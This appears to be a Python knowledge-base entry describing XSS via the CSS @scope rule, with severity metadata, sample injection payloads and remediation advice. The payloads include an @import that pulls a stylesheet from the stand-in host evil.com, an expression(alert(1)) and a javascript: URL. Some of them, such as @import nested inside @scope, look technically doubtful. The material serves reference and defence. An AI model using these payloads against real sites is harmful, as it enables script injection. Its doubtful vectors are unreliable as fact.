#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: CSS @scope XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via CSS @scope",
    "severity": "medium",
    "cvss_score": 6.3,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "css", "@scope", "scoping", "chrome-118"],
    "description": """
CSS @scope (Chrome 118+) allows scoping CSS rules. XSS vulnerabilities occur when user input
controls scope selectors or scoped CSS content without validation.

SEVERITY: MEDIUM
Can lead to CSS injection and style-based attacks. Scope selectors can be used for CSS injection.
""",
    "attack_vector": """
CSS SCOPE SELECTOR INJECTION:
@scope (${userInput}) {
  .content { color: red; }
}

CSS SCOPE TO INJECTION:
@scope (.container) to (${userInput}) {
  .content { color: red; }
}

CSS SCOPE WITH @IMPORT:
@scope (.container) {
  @import url('//evil.com/xss.css');
}

CSS SCOPE WITH EXPRESSION:
@scope (.container) {
  body {
    background: expression(alert(1));  // IE only
  }
}

CSS SCOPE WITH URL:
@scope (.container) {
  .content {
    background: url('javascript:alert(1)');
  }
}
""",
    "remediation": """
DEFENSE:

1. Validate scope selectors (alphanumeric, hyphens, underscores only)
2. Sanitize CSS content
3. Block @import in user-controlled CSS
4. Block expression() and javascript: URLs
5. Implement CSP style-src

SAFE PATTERN:
function validateScopeSelector(selector) {
  if (!/^[a-z0-9._-]+$/i.test(selector)) {
    throw new Error('Invalid scope selector');
  }
  return selector;
}
@scope (${validateScopeSelector(userInput)}) { }

CSS SANITIZATION:
import { sanitize } from 'css-sanitize';
const safeCSS = sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CSS @scope Specification
""",
}
